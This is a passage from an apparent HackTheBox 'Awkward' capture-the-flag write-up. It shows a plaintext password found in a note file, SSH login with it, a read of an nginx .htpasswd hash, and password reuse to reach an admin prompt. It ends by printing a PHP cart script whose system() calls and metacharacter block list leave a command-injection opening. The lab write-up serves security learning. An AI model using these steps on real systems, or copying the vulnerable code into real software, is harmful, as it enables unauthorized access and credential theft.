<span class="line"><span style="color:#E1E4E8">drwx</span><span style="color:#F97583">------</span><span style="color:#79B8FF">  2</span><span style="color:#E1E4E8"> dedsec dedsec  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 06</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">36</span><span style="color:#E1E4E8"> .ssh</span><span style="color:#F97583">/</span></span>
<span class="line"><span style="color:#E1E4E8">drwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x  </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8"> dedsec dedsec  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 06</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">35</span><span style="color:#E1E4E8"> Templates</span><span style="color:#F97583">/</span></span>
<span class="line"><span style="color:#E1E4E8">drwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x  </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8"> dedsec dedsec  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 06</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">35</span><span style="color:#E1E4E8"> Videos</span><span style="color:#F97583">/</span></span></code></pre>
<p>Found a <code>password</code> of bean user inside <code>.config/xpad/content-DS1ZS1 </code></p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">❯ cat .config</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">xpad</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">content</span><span style="color:#F97583">-</span><span style="color:#79B8FF">DS1ZS1</span></span>
<span class="line"><span style="color:#79B8FF">TO</span><span style="color:#B392F0"> DO</span><span style="color:#E1E4E8">:</span></span>
<span class="line"><span style="color:#F97583">-</span><span style="color:#E1E4E8"> Get real hat prices </span><span style="color:#F97583">/</span><span style="color:#E1E4E8"> stock from Christine</span></span>
<span class="line"><span style="color:#F97583">-</span><span style="color:#E1E4E8"> Implement more secure hashing mechanism for </span><span style="color:#79B8FF">HR</span><span style="color:#E1E4E8"> system</span></span>
<span class="line"><span style="color:#F97583">-</span><span style="color:#E1E4E8"> Setup better confirmation message when adding item to cart</span></span>
<span class="line"><span style="color:#F97583">-</span><span style="color:#E1E4E8"> Add support for item quantity </span><span style="color:#F97583">&gt;</span><span style="color:#79B8FF"> 1</span></span>
<span class="line"><span style="color:#F97583">-</span><span style="color:#E1E4E8"> Implement checkout system</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8">bold</span><span style="color:#79B8FF">HR</span><span style="color:#79B8FF"> SYSTEM</span><span style="color:#E1E4E8"></span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bold</span></span>
<span class="line"><span style="color:#E1E4E8">bean.hill</span></span>
<span class="line"><span style="color:#E1E4E8">014mrbeanrules</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">#</span><span style="color:#79B8FF">P</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0">https</span><span style="color:#E1E4E8">:</span><span style="color:#6A737D">//www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8">bold</span><span style="color:#79B8FF">MAKE</span><span style="color:#79B8FF"> SURE</span><span style="color:#79B8FF"> TO</span><span style="color:#79B8FF"> USE</span><span style="color:#79B8FF"> THIS</span><span style="color:#79B8FF"> EVERYWHERE</span><span style="color:#F97583"> ^^^</span><span style="color:#E1E4E8"></span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bold⏎</span></span></code></pre>
<ul>
<li>Creads of bean user - username: bean - password: 014mrbeanrules!#P
Let’s try to <code>ssh</code> in with that creads
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/cmd6.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
</li>
</ul>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>I run the linpeas but nothing found there, so I check the <code>/etc/hosts</code> file and I found a new vhost called <code>store.hat-valley.htb</code></p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">bean@</span><span style="color:#B392F0">awkward</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">~</span><span style="color:#E1E4E8">$ cat </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">etc</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">hosts</span></span>
<span class="line"><span style="color:#79B8FF">127.0</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">0.1</span><span style="color:#E1E4E8">       localhost hat</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">valley.htb store.hat</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">valley.htb</span></span>
<span class="line"><span style="color:#79B8FF">127.0</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">0.1</span><span style="color:#E1E4E8">       awkward</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8"># The following lines are desirable for IPv6 capable hosts</span></span>
<span class="line"><span style="color:#E1E4E8">::</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">     ip6</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">localhost ip6</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">loopback</span></span>
<span class="line"><span style="color:#B392F0">fe00</span><span style="color:#E1E4E8">::</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8"> ip6</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">localnet</span></span>
<span class="line"><span style="color:#B392F0">ff00</span><span style="color:#E1E4E8">::</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8"> ip6</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">mcastprefix</span></span>
<span class="line"><span style="color:#B392F0">ff02</span><span style="color:#E1E4E8">::</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8"> ip6</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">allnodes</span></span>
<span class="line"><span style="color:#B392F0">ff02</span><span style="color:#E1E4E8">::</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8"> ip6</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">allrouters</span></span></code></pre>
<p>Let’s add that in our <code>/etc/hosts</code> file and check what’s running on that</p>
<p>But it’s required <code>username</code> and <code>password</code></p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/web17.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>The website using <code>nginx</code> and the username and password <code>prompt</code> is coming from nginx because of <code>.htaccess</code> file which can usually be found inside <code>/etc/nginx/conf.d/</code> directory</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">bean@</span><span style="color:#B392F0">awkward</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">~</span><span style="color:#E1E4E8">$ cat </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">etc</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">nginx</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">conf.d</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">.htpasswd</span></span>
<span class="line"><span style="color:#B392F0">admin</span><span style="color:#E1E4E8">:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1</span></span></code></pre>
<blockquote>
<p>Got the Username, but the password is not crackable so let’s reuse the bean password on the prompt</p>
</blockquote>
<ul>
<li>Creads
<ul>
<li>username: admin</li>
<li>password: 014mrbeanrules!#P</li>
</ul>
</li>
</ul>
<p>And we <code>successfully</code> log in</p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/web18.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>And also we have the <code>source code</code> of the website inside <code>/var/www/store</code></p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">bean@</span><span style="color:#B392F0">awkward</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">/var</span><span style="color:#E1E4E8">/www/store$ pwd</span></span>
<span class="line"><span style="color:#F97583">/var</span><span style="color:#E1E4E8">/www/store</span></span>
<span class="line"><span style="color:#E1E4E8">bean@</span><span style="color:#B392F0">awkward</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">/var</span><span style="color:#E1E4E8">/www/store$ ls -al</span></span>
<span class="line"><span style="color:#E1E4E8">total </span><span style="color:#79B8FF">104</span></span>
<span class="line"><span style="color:#E1E4E8">drwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x </span><span style="color:#79B8FF">9</span><span style="color:#E1E4E8"> root root  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Oct  </span><span style="color:#79B8FF">6</span><span style="color:#79B8FF"> 01</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">35</span><span style="color:#E1E4E8"> .</span></span>
<span class="line"><span style="color:#E1E4E8">drwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x </span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8"> root root  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Oct  </span><span style="color:#79B8FF">6</span><span style="color:#79B8FF"> 01</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">35</span><span style="color:#E1E4E8"> ..</span></span>
<span class="line"><span style="color:#E1E4E8">drwxrwxrwx </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8"> root root  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Oct  </span><span style="color:#79B8FF">6</span><span style="color:#79B8FF"> 01</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">35</span><span style="color:#E1E4E8"> cart</span></span>
<span class="line"><span style="color:#F97583">-</span><span style="color:#E1E4E8">rwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x </span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8"> root root  </span><span style="color:#79B8FF">3664</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 20</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">09</span><span style="color:#E1E4E8"> cart_actions.php</span></span>
<span class="line"><span style="color:#F97583">-</span><span style="color:#E1E4E8">rwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x </span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8"> root root </span><span style="color:#79B8FF">12140</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 20</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">09</span><span style="color:#E1E4E8"> cart.php</span></span>
<span class="line"><span style="color:#F97583">-</span><span style="color:#E1E4E8">rwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x </span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8"> root root  </span><span style="color:#79B8FF">9143</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 20</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">09</span><span style="color:#E1E4E8"> checkout.php</span></span>
<span class="line"><span style="color:#E1E4E8">drwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8"> root root  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Oct  </span><span style="color:#79B8FF">6</span><span style="color:#79B8FF"> 01</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">35</span><span style="color:#E1E4E8"> css</span></span>
<span class="line"><span style="color:#E1E4E8">drwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8"> root root  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Oct  </span><span style="color:#79B8FF">6</span><span style="color:#79B8FF"> 01</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">35</span><span style="color:#E1E4E8"> fonts</span></span>
<span class="line"><span style="color:#E1E4E8">drwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x </span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8"> root root  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Oct  </span><span style="color:#79B8FF">6</span><span style="color:#79B8FF"> 01</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">35</span><span style="color:#E1E4E8"> img</span></span>
<span class="line"><span style="color:#F97583">-</span><span style="color:#E1E4E8">rwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x </span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8"> root root </span><span style="color:#79B8FF">14770</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 20</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">09</span><span style="color:#E1E4E8"> index.php</span></span>
<span class="line"><span style="color:#E1E4E8">drwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x </span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8"> root root  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Oct  </span><span style="color:#79B8FF">6</span><span style="color:#79B8FF"> 01</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">35</span><span style="color:#E1E4E8"> js</span></span>
<span class="line"><span style="color:#E1E4E8">drwxrwxrwx </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8"> root root  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Oct </span><span style="color:#79B8FF">29</span><span style="color:#79B8FF"> 16</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">50</span><span style="color:#E1E4E8"> product</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">details</span></span>
<span class="line"><span style="color:#F97583">-</span><span style="color:#E1E4E8">rwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x </span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8"> root root   </span><span style="color:#79B8FF">918</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 20</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">09</span><span style="color:#79B8FF"> README</span><span style="color:#E1E4E8">.md</span></span>
<span class="line"><span style="color:#F97583">-</span><span style="color:#E1E4E8">rwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x </span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8"> root root </span><span style="color:#79B8FF">13731</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 20</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">09</span><span style="color:#E1E4E8"> shop.php</span></span>
<span class="line"><span style="color:#E1E4E8">drwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x </span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8"> root root  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Oct  </span><span style="color:#79B8FF">6</span><span style="color:#79B8FF"> 01</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">35</span><span style="color:#E1E4E8"> static</span></span>
<span class="line"><span style="color:#F97583">-</span><span style="color:#E1E4E8">rwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x </span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8"> root root   </span><span style="color:#79B8FF">695</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 20</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">09</span><span style="color:#E1E4E8"> style.css</span></span></code></pre>
<p>Reading the <code>README.md</code> will tell us about</p>
<ol>
<li>They don’t use any <code>database</code> till now</li>
<li>They’re using the files to store data inside these directories
<ul>
<li><code>/product-details</code> which store the details of the products</li>
<li><code>/cart</code> which store the user items</li>
</ul>
</li>
<li>They <code>verify</code> their product with first header line which looks like <code>***Hat Valley Cart***</code></li>
</ol>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">bean@</span><span style="color:#B392F0">awkward</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">/var</span><span style="color:#E1E4E8">/www/store$ cat README.md</span></span>
<span class="line"><span style="color:#E1E4E8"># Hat Valley </span><span style="color:#F97583">-</span><span style="color:#E1E4E8"> Shop Online</span><span style="color:#F97583">!</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8">### To Do</span></span>
<span class="line"><span style="color:#79B8FF">1.</span><span style="color:#E1E4E8"> Waiting for </span><span style="color:#79B8FF">SQL</span><span style="color:#E1E4E8"> database to be setup, </span><span style="color:#F97583">using</span><span style="color:#79B8FF"> offline</span><span style="color:#E1E4E8"> files for now, </span><span style="color:#79B8FF">will</span><span style="color:#E1E4E8"> merge with database once it is setup</span></span>
<span class="line"><span style="color:#79B8FF">2.</span><span style="color:#E1E4E8"> Implement checkout system, link </span><span style="color:#F97583">with</span><span style="color:#E1E4E8"> credit card </span><span style="color:#B392F0">system</span><span style="color:#E1E4E8"> (Stripe</span><span style="color:#F97583">??</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#79B8FF">3.</span><span style="color:#E1E4E8"> Implement shop filter</span></span>
<span class="line"><span style="color:#79B8FF">4.</span><span style="color:#E1E4E8"> Get full catalogue </span><span style="color:#F97583">of</span><span style="color:#E1E4E8"> items</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8">### How to Add New Catalogue Item</span></span>
<span class="line"><span style="color:#79B8FF">1.</span><span style="color:#E1E4E8"> Copy an existing item from </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">product</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">details and paste it </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> the same folder, changing the name to reflect a </span><span style="color:#F97583">new</span><span style="color:#E1E4E8"> product </span><span style="color:#79B8FF">ID</span></span>
<span class="line"><span style="color:#79B8FF">2.</span><span style="color:#E1E4E8"> Change the fields to the appropriate values and save the file.</span></span>
<span class="line"><span style="color:#F97583">--</span><span style="color:#B392F0"> NOTE</span><span style="color:#E1E4E8">: Please leave the header on first line</span><span style="color:#F97583">!</span><span style="color:#E1E4E8"> This is used to verify it </span><span style="color:#F97583">as</span><span style="color:#B392F0"> a</span><span style="color:#B392F0"> valid</span><span style="color:#B392F0"> Hat</span><span style="color:#B392F0"> Valley</span><span style="color:#B392F0"> product</span><span style="color:#E1E4E8">. </span><span style="color:#F97583">--</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8">### Hat Valley Cart</span></span>
<span class="line"><span style="color:#E1E4E8">Right now, the user</span><span style="color:#9ECBFF">&#39;s cart is stored within /cart, and is named according to the user&#39;</span><span style="color:#E1E4E8">s session </span><span style="color:#79B8FF">ID</span><span style="color:#E1E4E8">. All products are appended to the same file for each user.</span></span>
<span class="line"><span style="color:#E1E4E8">To test cart functionality, create a </span><span style="color:#F97583">new</span><span style="color:#E1E4E8"> cart file and add items to it, and see how they are reflected on the store website</span><span style="color:#F97583">!</span></span></code></pre>
<p>Checking the <code>cart_actions.php</code> file</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">bean@</span><span style="color:#B392F0">awkward</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">/var</span><span style="color:#E1E4E8">/www/store$ cat cart_actions.php</span></span>
<span class="line"><span style="color:#F97583">&lt;?</span><span style="color:#E1E4E8">php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8">$STORE_HOME </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> &quot;/var/www/store/&quot;</span><span style="color:#E1E4E8">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6A737D">//check for valid hat valley store item</span></span>
<span class="line"><span style="color:#F97583">function</span><span style="color:#B392F0"> checkValidItem</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">$filename</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">file_exists</span><span style="color:#E1E4E8">($filename)) {</span></span>
<span class="line"><span style="color:#E1E4E8">        $first_line </span><span style="color:#F97583">=</span><span style="color:#B392F0"> file</span><span style="color:#E1E4E8">($filename)[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">];</span></span>
<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">strpos</span><span style="color:#E1E4E8">($first_line, </span><span style="color:#9ECBFF">&quot;***Hat Valley&quot;</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">!==</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
<span class="line"><span style="color:#E1E4E8">        }</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
<span class="line"><span style="color:#E1E4E8">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6A737D">//add to cart</span></span>
<span class="line"><span style="color:#B392F0">if</span><span style="color:#E1E4E8"> ($_SERVER[</span><span style="color:#9ECBFF">&#39;REQUEST_METHOD&#39;</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">===</span><span style="color:#9ECBFF"> &#39;POST&#39;</span><span style="color:#F97583"> &amp;&amp;</span><span style="color:#E1E4E8"> $_POST[</span><span style="color:#9ECBFF">&#39;action&#39;</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">===</span><span style="color:#9ECBFF"> &#39;add_item&#39;</span><span style="color:#F97583"> &amp;&amp;</span><span style="color:#E1E4E8"> $_POST[</span><span style="color:#9ECBFF">&#39;item&#39;</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">&amp;&amp;</span><span style="color:#E1E4E8"> $_POST[</span><span style="color:#9ECBFF">&#39;user&#39;</span><span style="color:#E1E4E8">]) {</span></span>
<span class="line"><span style="color:#E1E4E8">    $item_id </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $_POST[</span><span style="color:#9ECBFF">&#39;item&#39;</span><span style="color:#E1E4E8">];</span></span>
<span class="line"><span style="color:#E1E4E8">    $user_id </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $_POST[</span><span style="color:#9ECBFF">&#39;user&#39;</span><span style="color:#E1E4E8">];</span></span>
<span class="line"><span style="color:#E1E4E8">    $bad_chars </span><span style="color:#F97583">=</span><span style="color:#B392F0"> array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;;&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;&amp;&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;|&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;&gt;&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;&lt;&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;*&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;?&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;`&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;$&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;(&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;)&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;{&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;}&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;[&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;]&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;!&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;#&quot;</span><span style="color:#E1E4E8">); </span><span style="color:#6A737D">//no hacking allowed!!</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0">    foreach</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">$bad_chars</span><span style="color:#FFAB70"> as</span><span style="color:#FFAB70"> $bad</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">strpos</span><span style="color:#E1E4E8">($item_id, $bad) </span><span style="color:#F97583">!==</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#E1E4E8">            echo </span><span style="color:#9ECBFF">&quot;Bad character detected!&quot;</span><span style="color:#E1E4E8">;</span></span>
<span class="line"><span style="color:#E1E4E8">            exit;</span></span>
<span class="line"><span style="color:#E1E4E8">        }</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0">    foreach</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">$bad_chars</span><span style="color:#FFAB70"> as</span><span style="color:#FFAB70"> $bad</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">strpos</span><span style="color:#E1E4E8">($user_id, $bad) </span><span style="color:#F97583">!==</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#E1E4E8">            echo </span><span style="color:#9ECBFF">&quot;Bad character detected!&quot;</span><span style="color:#E1E4E8">;</span></span>
<span class="line"><span style="color:#E1E4E8">            exit;</span></span>
<span class="line"><span style="color:#E1E4E8">        }</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0">    if</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">checkValidItem</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;{$STORE_HOME}product-details/{$item_id}.txt&quot;</span><span style="color:#E1E4E8">)) {</span></span>
<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">!</span><span style="color:#B392F0">file_exists</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;{$STORE_HOME}cart/{$user_id}&quot;</span><span style="color:#E1E4E8">)) {</span></span>
<span class="line"><span style="color:#B392F0">            system</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;echo &#39;***Hat Valley Cart***&#39; &gt; {$STORE_HOME}cart/{$user_id}&quot;</span><span style="color:#E1E4E8">);</span></span>
<span class="line"><span style="color:#E1E4E8">        }</span></span>
<span class="line"><span style="color:#B392F0">        system</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 &gt;&gt; {$STORE_HOME}cart/{$user_id}&quot;</span><span style="color:#E1E4E8">);</span></span>
<span class="line"><span style="color:#E1E4E8">        echo </span><span style="color:#9ECBFF">&quot;Item added successfully!&quot;</span><span style="color:#E1E4E8">;</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"><span style="color:#E1E4E8">    else {</span></span>
<span class="line"><span style="color:#E1E4E8">        echo </span><span style="color:#9ECBFF">&quot;Invalid item&quot;</span><span style="color:#E1E4E8">;</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"><span style="color:#E1E4E8">    exit;</span></span>
<span class="line"><span style="color:#E1E4E8">}</span></span>
<span class="line"></span>
